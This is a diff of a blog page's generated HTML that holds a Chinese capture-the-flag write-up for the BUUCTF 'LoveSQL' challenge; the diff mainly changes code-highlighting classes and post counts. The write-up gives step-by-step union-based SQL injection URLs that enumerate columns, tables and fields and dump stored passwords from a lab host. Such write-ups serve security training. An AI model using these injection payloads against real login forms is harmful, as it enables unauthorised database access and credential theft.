@@ -392,18 +392,18 @@
         <h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="极客大挑战 2019 LoveSQL"></a>极客大挑战 2019 LoveSQL</h1><p>打开题目  先用万能密码登录试试</p>
 <p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/0.png" alt="avatar"></p>
 <p>用order by试试字段</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3a2fed05-d0ad-42fe-9dbd-898c38712309.node3.buuoj.cn/check.php?username=1%27%20order%20by%204%20%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">3</span>a<span class="number">2</span>fed<span class="number">05</span>-d<span class="number">0</span>ad<span class="number">-42</span>fe<span class="number">-9</span>dbd<span class="number">-898</span><span class="keyword">c</span><span class="number">38712309</span>.node<span class="number">3</span>.buuoj.cn/check.php?username=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span>order<span class="symbol">%20</span>by<span class="symbol">%204</span><span class="symbol">%20</span><span class="symbol">%23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>
 <p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/1.png" alt="avatar"></p>
 <p>得知有3个字段  接下来就是常规的注入了</p>
 <p>爆表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3a2fed05-d0ad-42fe-9dbd-898c38712309.node3.buuoj.cn/check.php?username=1%27%20union%20select%201%2C2%2Cgroup_concat%28table_name%29%20from%20information_schema.tables%20where%20table_schema%3D%20database%28%29%20%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">3</span>a<span class="number">2</span>fed<span class="number">05</span>-d<span class="number">0</span>ad<span class="number">-42</span>fe<span class="number">-9</span>dbd<span class="number">-898</span><span class="keyword">c</span><span class="number">38712309</span>.node<span class="number">3</span>.buuoj.cn/check.php?username=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%2</span>C<span class="number">2</span><span class="symbol">%2</span>Cgroup_concat<span class="symbol">%28</span>table_name<span class="symbol">%29</span><span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema<span class="symbol">%3</span>D<span class="symbol">%20</span>database<span class="symbol">%28</span><span class="symbol">%29</span><span class="symbol">%20</span><span class="symbol">%23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>
 <p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/2.png" alt="avatar"></p>
 <p>查一下表 l0ve1ysq1</p>
 <p>爆字段</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3a2fed05-d0ad-42fe-9dbd-898c38712309.node3.buuoj.cn/check.php?username=1%27%20union%20select%201%2C2%2Cgroup_concat%28column_name%29%20from%20information_schema.columns%20where%20table_name%3D%20%27l0ve1ysq1%27%20%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">3</span>a<span class="number">2</span>fed<span class="number">05</span>-d<span class="number">0</span>ad<span class="number">-42</span>fe<span class="number">-9</span>dbd<span class="number">-898</span><span class="keyword">c</span><span class="number">38712309</span>.node<span class="number">3</span>.buuoj.cn/check.php?username=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%2</span>C<span class="number">2</span><span class="symbol">%2</span>Cgroup_concat<span class="symbol">%28</span>column_name<span class="symbol">%29</span><span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.columns<span class="symbol">%20</span>where<span class="symbol">%20</span>table_name<span class="symbol">%3</span>D<span class="symbol">%20</span><span class="symbol">%27</span>l<span class="number">0</span>ve<span class="number">1</span>ysq<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="symbol">%23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>
 <p>得到三个字段 查一下password</p>
 <p>爆数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3a2fed05-d0ad-42fe-9dbd-898c38712309.node3.buuoj.cn/check.php?username=1%27%20union%20select%201%2C2%2Cgroup_concat%28password%29%20from%20l0ve1ysq1%20%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">3</span>a<span class="number">2</span>fed<span class="number">05</span>-d<span class="number">0</span>ad<span class="number">-42</span>fe<span class="number">-9</span>dbd<span class="number">-898</span><span class="keyword">c</span><span class="number">38712309</span>.node<span class="number">3</span>.buuoj.cn/check.php?username=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%2</span>C<span class="number">2</span><span class="symbol">%2</span>Cgroup_concat<span class="symbol">%28</span>password<span class="symbol">%29</span><span class="symbol">%20</span>from<span class="symbol">%20</span>l<span class="number">0</span>ve<span class="number">1</span>ysq<span class="number">1</span><span class="symbol">%20</span><span class="symbol">%23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>
 
 <p>得到flag</p>
 
@@ -529,7 +529,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-count">37</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -540,7 +540,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
